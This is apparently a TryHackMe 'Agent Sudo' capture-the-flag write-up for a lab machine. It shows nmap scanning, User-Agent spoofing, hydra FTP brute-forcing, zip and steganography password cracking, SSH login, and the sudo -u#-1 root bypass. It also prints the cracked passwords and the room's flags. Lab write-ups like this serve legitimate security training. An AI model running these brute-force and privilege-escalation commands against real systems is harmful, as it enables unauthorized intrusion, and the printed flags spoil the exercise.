# Target:10.201.32.87
## Enumeration
```
nmap 10.201.32.87  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 10:10 IST  
Nmap scan report for 10.201.32.87  
Host is up (0.42s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT   STATE SERVICE  
21/tcp open  ftp  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds
```
lets visit the website 
*[Image: image]*
this is a hint to use the codename as user-agent ,since it is from R we can assume that each use a letter as codename lets try to chnage the letters when i tried A and B nothing happened but when i tried C it got redirected 
to do this i used burpsuite 
*[Image: image]*
in burpsuite proxy turn on intercept and visit webpage 
*[Image: image]*
here change the user-agent to C and forward you can then turn off intercept going to browser you will be in a different web page 
*[Image: image]*
so from this the agent with codename C is chris and his password is weak
lets brute force it since in tryhackme asks for ftp password lets do ftp brute force using hydra
```

hydra -l chris  -P /usr/share/wordlists/rockyou.txt 10.201.32.87 ftp      
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret servi  
ce organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anywa  
y).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 10:43:54  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previou  
s session found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tri  
es per task  
[DATA] attacking ftp://10.201.32.87:21/  
[STATUS] 216.00 tries/min, 216 tries in 00:01h, 14344183 to do in 1106:49h, 16 active  
[21][ftp] host: 10.201.32.87   login: chris   password: crystal  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 10:45:19
```
now that we have it lets login to ftp 
```
ftp 10.201.32.87  
Connected to 10.201.32.87.  
220 (vsFTPd 3.0.3)  
Name (10.201.32.87:nobu): chris  
331 Please specify the password.  
Password:    
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||51321|)  
150 Here comes the directory listing.  
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt  
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg  
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png  
226 Directory send OK.  
ftp> get *  
local: * remote: *  
229 Entering Extended Passive Mode (|||42293|)  
550 Failed to open file.  
ftp> get To_agentJ.txt  
local: To_agentJ.txt remote: To_agentJ.txt  
229 Entering Extended Passive Mode (|||26429|)  
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).  
100% |*********************************************************|   217        6.27 MiB/s    00:00 ETA  
226 Transfer complete.  
217 bytes received in 00:00 (0.44 KiB/s)  
ftp> get cutie.png  
local: cutie.png remote: cutie.png  
229 Entering Extended Passive Mode (|||57643|)  
150 Opening BINARY mode data connection for cutie.png (34842 bytes).  
100% |*********************************************************| 34842       46.26 KiB/s    00:00 ETA  
226 Transfer complete.  
34842 bytes received in 00:01 (30.23 KiB/s)  
ftp> get cute-alien.jpg  
local: cute-alien.jpg remote: cute-alien.jpg  
229 Entering Extended Passive Mode (|||43157|)  
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).  
100% |*********************************************************| 33143       39.55 KiB/s    00:00 ETA  
226 Transfer complete.  
33143 bytes received in 00:01 (22.57 KiB/s)  
ftp>
```
now we have downloaded 3 files from ftp 
lets see what is in it
```
cat To_agentJ.txt    
Dear agent J,  
  
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your logi  
n password is somehow stored in the fake picture. It shouldn't be a problem for you.  
  
From,  
Agent C
```
hmm the password is stored in the pictures stenography or something...
cute-alien.png
*[Image: image]*
cutie.png
*[Image: image]*
in tryhack it asks for zip password so there is a zip file hidden some where 
i suspect the images might hide them 
lets use binwalk to extract it 
```
binwalk -e cutie.png    
  
DECIMAL       HEXADECIMAL     DESCRIPTION  
--------------------------------------------------------------------------------  
869           0x365           Zlib compressed data, best compression  
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86,  
name: To_agentR.txt  
  
WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```
my intuition was right it is hidden in a image lets  crack the pass word using john
```
cd _cutie.png.extracted    
                                                                                                        
┌──(nobu㉿kali)-[~/Downloads/Agent-sudo/_cutie.png.extracted]  
└─$ ls  
365  365.zlib  8702.zip

┌──(nobu㉿kali)-[~/Downloads/Agent-sudo/_cutie.png.extracted]  
└─$ ls                                                           
365  365.zlib  8702.zip  
                                                                                                        
┌──(nobu㉿kali)-[~/Downloads/Agent-sudo/_cutie.png.extracted]  
└─$ zip2john 8702.zip > hash.txt  
                                                                                                        
┌──(nobu㉿kali)-[~/Downloads/Agent-sudo/_cutie.png.extracted]  
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    
Using default input encoding: UTF-8  
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])  
Cost 1 (HMAC size) is 78 for all loaded hashes  
Will run 32 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
alien            (8702.zip/To_agentR.txt)        
1g 0:00:00:00 DONE (2025-09-16 10:50) 5.555g/s 364088p/s 364088c/s 364088C/s 123456..sabrina7  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
lets see what is inside the zip 
after extracting with password we found a txt file named 
*[Image: image]*
what is this "QXJlYTUx"?
since tryhackme ask for steg password lets run stegcracker on cute_alien.png
```
stegcracker cute-alien.jpg -t 100  
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)  
Copyright (c) 2025 - Luke Paris (Paradoxis)  
  
StegCracker has been retired following the release of StegSeek, which    
will blast through the rockyou.txt wordlist within 1.9 second as opposed    
to StegCracker which takes ~5 hours.  
  
StegSeek can be found at: https://github.com/RickdeJager/stegseek  
  
No wordlist was specified, using default rockyou.txt wordlist.  
Counting lines in wordlist..  
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..  
Successfully cracked file with password: Area51doro1111  
Tried 445683 passwords  
Your file has been written to: cute-alien.jpg.out  
Area51
```
lets see what is inside it 
```
cat cute-alien.jpg.out  
Hi james,  
  
Glad you find this message. Your login password is hackerrules!  
  
Don't ask me why the password look cheesy, ask agent R who set this password for you.  
  
Your buddy,  
chris
```
so the person with codename j is james and we have his password 
let login with it 
```
ssh james@10.201.32.87    
  
The authenticity of host '10.201.32.87 (10.201.32.87)' can't be established.  
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.201.32.87' (ED25519) to the list of known hosts.  
james@10.201.32.87's password:    
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage  
  
 System information as of Tue Sep 16 06:33:28 UTC 2025  
  
 System load:  0.24              Processes:           102  
 Usage of /:   39.7% of 9.78GB   Users logged in:     0  
 Memory usage: 24%               IP address for ens5: 10.201.32.87  
 Swap usage:   0%  
  
  
* Canonical Livepatch is available for installation.  
  - Reduce system reboots and improve kernel security. Activate at:  
    https://ubuntu.com/livepatch  
  
75 packages can be updated.  
33 updates are security updates.  
  
  
Last login: Tue Oct 29 14:26:27 2019  
james@agent-sudo:~$ ls  
Alien_autospy.jpg  user_flag.txt  
james@agent-sudo:~$ cat user_flag.txt  
b03d975e8c92a7c04146cfa7a5a313c7
```
now we have user privilage we need to get root privilage 
lets check common privilage escalation vector
```
james@agent-sudo:~$ sudo -l  
[sudo] password for james:    
Matching Defaults entries for james on agent-sudo:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User james may run the following commands on agent-sudo:  
   (ALL, !root) /bin/bash
```
wait tryhackme ask for CVE so check it on internet 

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash  
[sudo] password for james:    
root@agent-sudo:~# ls  
Alien_autospy.jpg  user_flag.txt  
root@agent-sudo:~# cd /root  
root@agent-sudo:/root# ls  
root.txt  
root@agent-sudo:/root# cat root.txt  
To Mr.hacker,  
  
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your mach  
ine.    
  
Your flag is    
b53a02f55b57d4439e3341834d70c062  
  
By,  
DesKel a.k.a Agent R
```
